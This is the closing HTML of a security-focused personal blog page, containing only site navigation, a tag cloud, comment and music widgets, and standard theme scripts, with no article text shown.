}</script></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="Theme">Theme</a><a class="footer-bar-link cc" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.en" title="Copyright"><i class="anzhiyufont anzhiyu-icon-copyright-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-by-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nc-line"></i><i class="anzhiyufont anzhiyu-icon-creative-commons-nd-line"></i></a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">22</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">6</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">Contact</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100011698690769" title="Facebook"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/fb.png" alt="Facebook"/><span class="back-menu-item-text">Facebook</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.linkedin.com/in/%E5%AD%90%E9%9B%8B-%E9%99%B3-11087825b/" title="LinkedIn"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/linkedin.png" alt="LinkedIn"/><span class="back-menu-item-text">LinkedIn</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">English site</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://en.cx330.tw" title="CX330's Universe"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/assets/me.jpg" alt="CX330's Universe"/><span class="back-menu-item-text">CX330's Universe</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-list-ul faa-tada" style="font-size: 0.9em;"></i><span> Archives</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> Tags</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-dice faa-tada" style="font-size: 0.9em;"></i><span> Random</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> Social</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> Link exchange</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-message faa-tada" style="font-size: 0.9em;"></i><span> Message board</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=12295857597&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> Music bar</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> Life snippets</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/collect/"><i class="anzhiyufont anzhiyu-icon-book faa-tada" style="font-size: 0.9em;"></i><span> Collections</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> Photos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> Whoami</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/subscribe/"><i class="anzhiyufont anzhiyu-icon-rss faa-tada" style="font-size: 0.9em;"></i><span> Subscribe</span></a></li></ul></div></div><span class="sidebar-menu-item-title">Tags</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AI/" style="font-size: 0.88rem;">AI<sup>1</sup></a><a href="/tags/AIS3/" style="font-size: 0.88rem;">AIS3<sup>1</sup></a><a href="/tags/Blog/" style="font-size: 0.88rem;">Blog<sup>1</sup></a><a href="/tags/CTF/" style="font-size: 0.88rem;">CTF<sup>14</sup></a><a href="/tags/Crypto/" style="font-size: 0.88rem;">Crypto<sup>4</sup></a><a href="/tags/Cryptography/" style="font-size: 0.88rem;">Cryptography<sup>2</sup></a><a href="/tags/CyberSec/" style="font-size: 0.88rem;">CyberSec<sup>12</sup></a><a href="/tags/GDSC/" style="font-size: 0.88rem;">GDSC<sup>1</sup></a><a href="/tags/HTB/" style="font-size: 0.88rem;">HTB<sup>6</sup></a><a href="/tags/HackTheBox/" style="font-size: 0.88rem;">HackTheBox<sup>3</sup></a><a href="/tags/Hacker/" style="font-size: 0.88rem;">Hacker<sup>1</sup></a><a href="/tags/PicoCTF/" style="font-size: 0.88rem;">PicoCTF<sup>8</sup></a><a href="/tags/Pwn/" style="font-size: 0.88rem;">Pwn<sup>1</sup></a><a href="/tags/SCIST/" style="font-size: 0.88rem;">SCIST<sup>2</sup></a><a href="/tags/Security/" style="font-size: 0.88rem;">Security<sup>1</sup></a><a href="/tags/TechStreak30/" style="font-size: 0.88rem;">TechStreak30<sup>9</sup></a><a href="/tags/Web/" style="font-size: 0.88rem;">Web<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/" style="font-size: 0.88rem;">密碼學<sup>1</sup></a><a href="/tags/%E7%AD%86%E8%A8%98/" style="font-size: 0.88rem;">筆記<sup>1</sup></a><a href="/tags/%E7%B6%B2%E9%A0%81%E9%96%8B%E7%99%BC/" style="font-size: 0.88rem;">網頁開發<sup>1</sup></a><a href="/tags/%E8%B3%87%E5%AE%89/" style="font-size: 0.88rem;">資安<sup>6</sup></a><a href="/tags/%E9%A7%AD%E5%AE%A2/" style="font-size: 0.88rem;">駭客<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">简</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><a id="switch-commentBarrage" href="javascript:anzhiyu.switchCommentBarrage();" title="開關彈幕"><i class="anzhiyufont anzhiyu-icon-danmu"></i></a><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">Play music</a><div id="console-music-bg"></div><meting-js id="12295857597" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>複製選中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘貼文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到評論</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打開</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>複製鏈接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>複製此圖片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下載此圖片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打開圖片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站內搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音樂</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切換到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切換到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=7032963191&amp;userid=6279304773&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>複製歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>隨便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分類</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章標籤</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>複製地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">關閉熱評</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>转为简体</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    anzhiyu.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script><script>(() => {
  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaid.length === 0) return
  const runMermaid = () => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    Array.from($mermaid).forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
      const mermaidID = 'mermaid-' + index
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)

      const renderV10 = () => {
        renderFn.then(({svg}) => {
          mermaidSrc.insertAdjacentHTML('afterend', svg)
        })
      }

      const renderV9 = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
    })
  }

  const loadMermaid = () => {
    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid@10.2.4/dist/mermaid.min.js').then(runMermaid)
  }

  anzhiyu.addGlobalFn('themeChange', runMermaid, 'mermaid')

  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://comments.cx330.tw/',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://comments.cx330.tw/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"><script async src="/js/anzhiyu/comment_barrage.js"></script></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[image]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[link]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[code]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://comments.cx330.tw/',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "Unable to get the data, please make sure the settings are correct."
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += 'No Comment'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.0.0/waterfall/waterfall.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'G-PM5RRNPNEB', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>